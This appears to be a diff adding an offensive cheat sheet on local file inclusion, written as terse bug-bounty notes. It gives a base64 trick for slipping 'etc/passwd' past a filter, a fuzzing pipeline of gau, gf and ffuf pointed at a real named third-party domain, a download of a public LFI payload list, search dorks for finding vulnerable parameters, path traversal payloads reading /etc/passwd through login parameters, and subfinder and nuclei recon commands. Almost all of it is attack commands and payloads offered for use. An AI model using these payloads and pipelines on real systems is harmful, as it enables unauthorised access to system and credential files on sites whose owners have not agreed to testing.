@@ -1,0 +1,53 @@
+Lfi
+====
+
+
+url/?f=etc/passwd ==> 403
+encode etc/passwd as base64
+
+url/?f=L2V0Yy9wYXNzd2Q=  ==> 200
+
+#note 
+you can use this trick in SQL , SSTI , XSS , LFI , Etc...
+
+echo https://bloemendalerpolder.mett.nl | gau | urldedupe -qs | gf lfi |  sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
+
+
+wget https://raw.githubusercontent.com/coffinsp/payloads/main/lfi.txt   coffin GitHub payload list
+
+
+
+https://github.com/projectdiscovery/fuzzing-templates/tree/main/lfi            templates
+
+
+inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example[.]com
+
+Find endpoints for LFI testing
+
+
+1- Found login page
+2- Intercept POST login request
+3- Found parameter called config=
+4- But Payload ../../../../../../../../../etc/passwd
+5- Successfully read data
+
+
+1- Go to admin. site.tld/login
+2- Tried to login with wrong credentials     > error
+3- Send to burp repeater 
+4- Found new parameter filename because of error
+5- tried payload
+../../../../../../../../../../../../etc/passwd
+6- Full LFI ✅
+
+
+If you will see below ss
+I came back touching local files with 500 error 😅
+Payload : ../../../../../../../../../../../../../etc/passwd
+weird case not a full #LFI
+
+
+
+subfinder -d xyz.com | httpx| gau | uro | gf lfi | tee -a subdo.txt
+
+nuclei -l sudo.txt -tags lfi
